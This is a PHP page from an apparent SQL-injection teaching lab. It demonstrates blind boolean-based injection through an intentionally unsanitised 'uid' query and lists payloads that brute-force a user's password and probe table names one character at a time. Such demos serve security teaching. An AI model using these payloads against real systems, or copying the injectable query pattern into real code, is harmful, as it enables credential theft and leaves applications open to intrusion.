<?php
/**
 * DEMO: Blind Boolean-Based SQL Injection
 *
 * Attack goal: No data is returned, no errors shown.
 * The attacker infers information by observing whether the page says
 * "User found" vs "User not found" for true/false conditions.
 *
 * Try these payloads in the User ID field:
 *   1 AND 1=1          → "User found"  (true condition)
 *   1 AND 1=2          → "User not found" (false condition)
 *   1 AND substring((SELECT database()),1,1)='s'   → true if DB name starts with 's'
 *   1 AND substring((SELECT password FROM user WHERE id=8),1,1)='1'  → brute-force password
 *   1 AND (SELECT COUNT(*) FROM secret) > 0        → confirms secret table exists
 */

if ( ! defined('SQL_INJECTION_IN_PHP') ) {
    die('Direct access not permitted');
}
?>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">
    <strong>⚠️ Vulnerable Page — Blind Boolean-Based Injection Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-1"><strong>Objective:</strong> Extract data one bit at a time using only true/false responses — no data, no errors.</p>
    <p class="mb-1"><strong>Try these payloads:</strong></p>
    <ul class="mb-0">
      <li><code>1 AND 1=1</code> → User found (true)</li>
      <li><code>1 AND 1=2</code> → User not found (false)</li>
      <li><code>1 AND substring((SELECT database()),1,1)='s'</code> → true if DB name starts with 's'</li>
      <li><code>1 AND substring((SELECT password FROM user WHERE id=8),1,1)='1'</code> → brute-force 1st char of password</li>
      <li><code>1 AND (SELECT COUNT(*) FROM secret) > 0</code> → confirms secret table exists</li>
    </ul>
    <p class="mt-2 mb-0 text-muted small">Notice: the page reveals NOTHING about data — only existence. Yet the attacker can extract any value character by character.</p>
  </div>
</div>

<form method="get" class="mb-3">
  <input type="hidden" name="action" value="blind_boolean"/>
  <div class="input-group" style="max-width:400px">
    <span class="input-group-text">User ID</span>
    <input type="text" name="uid" class="form-control"
           placeholder="e.g. 1"
           value="<?= htmlspecialchars($_GET['uid'] ?? '') ?>">
    <button class="btn btn-outline-secondary" type="submit">Check</button>
  </div>
</form>

<?php
$uid = $_GET['uid'] ?? '';

if ($uid !== '') {
    // Intentionally vulnerable query
    $sql = "SELECT id FROM user WHERE id = {$uid}";

    // Show the SQL only to the instructor — in a real blind scenario this is hidden
    echo '<div class="alert alert-secondary"><strong>Generated SQL (normally hidden from attacker):</strong><br>'
         . '<code>' . htmlspecialchars($sql) . '</code></div>';

    try {
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_SILENT);
        $result = $pdo->query($sql);

        // The page only reveals found/not-found — nothing else
        if ($result && $result->rowCount() > 0) {
            echo '<div class="alert alert-success" style="max-width:400px">';
            echo '<strong>✅ User found.</strong>';
            echo '</div>';
        } else {
            echo '<div class="alert alert-warning" style="max-width:400px">';
            echo '<strong>❌ User not found.</strong>';
            echo '</div>';
        }
    } catch (\PDOException $e) {
        // Errors are suppressed — attacker only sees the binary result
        echo '<div class="alert alert-warning" style="max-width:400px"><strong>❌ User not found.</strong></div>';
    }

    echo '<div class="mt-3 p-3 bg-light border rounded">';
    echo '<strong>How the attack works:</strong><br>';
    echo 'The attacker scripts thousands of requests like:<br>';
    echo '<code>id=1 AND substring((SELECT password FROM user WHERE id=8),1,1)=\'a\'</code><br>';
    echo '<code>id=1 AND substring((SELECT password FROM user WHERE id=8),1,1)=\'b\'</code><br>';
    echo '... cycling through every character until "User found" appears.';
    echo '</div>';
}
?>
